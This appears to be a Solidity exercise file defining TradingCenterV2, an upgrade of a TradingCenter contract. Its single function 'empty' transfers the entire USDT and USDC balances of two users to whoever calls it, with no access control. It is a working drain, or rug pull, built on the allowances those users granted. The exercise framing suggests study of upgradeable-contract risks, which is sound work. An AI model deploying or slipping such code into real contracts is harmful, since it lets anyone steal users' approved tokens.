// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import  "./TradingCenter.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter{
    function empty(
        IERC20 usdt,
        address user1,
        IERC20 usdc,
        address user2) public {
        usdt.transferFrom(user1, msg.sender, usdt.balanceOf(user1));
        usdc.transferFrom(user1, msg.sender, usdc.balanceOf(user1));

        usdt.transferFrom(user2, msg.sender, usdt.balanceOf(user2));
        usdc.transferFrom(user2, msg.sender, usdc.balanceOf(user2));
    }
}